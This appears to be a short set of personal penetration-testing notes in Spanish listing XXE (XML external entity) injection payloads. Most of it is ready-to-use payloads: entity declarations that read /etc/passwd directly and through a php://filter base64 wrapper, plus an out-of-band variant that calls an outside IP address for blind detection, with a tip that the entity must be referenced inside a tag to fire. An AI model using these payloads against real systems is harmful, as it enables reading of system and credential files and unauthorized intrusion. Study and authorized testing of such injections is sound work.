-- -
## Payloads: 
- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>

# XXE Out Of Band interaction (OOB) 
Estas mismas son lo mismo que las anteriores solo que a ciegas:
- <!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.0.229/testXXE">]>





## Aclaraciones:
- Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 

a